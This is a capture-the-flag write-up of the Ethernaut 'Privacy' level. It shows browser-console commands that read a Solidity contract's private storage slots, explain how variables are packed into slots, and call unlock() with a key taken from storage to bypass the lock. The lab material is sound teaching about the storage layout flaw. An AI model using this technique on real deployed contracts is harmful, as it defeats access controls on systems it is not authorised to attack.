# **Level 12 — Privacy**

## 🎯 Goal  
Unlock the contract — that is, make the locked variable equal to false.

## 💥 Vulnerability  
In a previous level, we learned that any storage variable can be read externally, even if it's marked private, using `web3.eth.getStorageAt`.
In this contract, we also need to consider Solidity’s storage optimization rules:
**small variables (like uint8, bool, uint16) that appear sequentially will be packed into a single storage slot (up to 32 bytes), instead of being stored separately.**
This optimization saves gas, but developers can forget about it — and that opens the door for an attacker.

The part of the vulnerable code:
```solidity 
// Solidity code 
function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }
```

## 🛠 ️Solution (via browser console)
The following steps were executed:
```js
// JS console input 
// 0. Check the current value of locked - true
(await contract.locked()).toString()

// 1. Check the current value of ID - 1752088932 (hex: 0x686ec164)
(await contract.ID()).toString()

// 2. Sequentially checking values in storage slots - from 0 to 7

await web3.eth.getStorageAt( instance_address, 0) 
// 0x0000000000000000000000000000000000000000000000000000000000000001 -> bool locked = true (1 byte --> 01)

await web3.eth.getStorageAt( instance_address, 1)
// 0x00000000000000000000000000000000000000000000000000000000686ec164 -> uint256 ID = block.timestamp

await web3.eth.getStorageAt( instance_address, 2)
// 0x00000000000000000000000000000000000000000000000000000000c164ff0a -> combination of small variables 
// uint8 flattening = 10 (1 byte --> 0a) + uint8 denomination = 255 (1 byte --> ff) + uint16 awkwardness (2 bytes --> c164)

// Extracting slots of bytes32[3] data --> 32 bytes = 256 bites = 64 hex-symbols
await web3.eth.getStorageAt( instance_address, 3)
// 0x320b7a6767c698f87d557157682215ef42d77cac78ea82a4518167878b8b72f6 - data[0] (bytes32)
await web3.eth.getStorageAt( instance_address, 4)
// 0x6b58d934e89de68e68d7e32d69bddeb6fbb3aaba12500e75bbb34d508d46004e - data[1] (bytes32)
await web3.eth.getStorageAt( instance_address, 5)
// 0x6a3202dd914b17af1382cdf5843a57cf0cd41ea62e5bfd918eb5a30e3eac13da - data[2] (bytes32)

await web3.eth.getStorageAt( instance_address, 6)
// 0x0000000000000000000000000000000000000000000000000000000000000000 - empty slot
await web3.eth.getStorageAt( instance_address, 7)
// 0x0000000000000000000000000000000000000000000000000000000000000000 - empty slot
await web3.eth.getStorageAt( instance_address, 8)
// 0x0000000000000000000000000000000000000000000000000000000000000000 - empty slot

// 3. Call unlock() function with bytes16(data[2])
contract.unlock("0x6a3202dd914b17af1382cdf5843a57cf")

// 4. Recheck the value of locked - false
(await contract.locked()).toString()
```

## 🧙 Outcome
The contract was successfully unlocked.
The rule about variable packing and storage layout in Solidity has been fully understood and mastered.

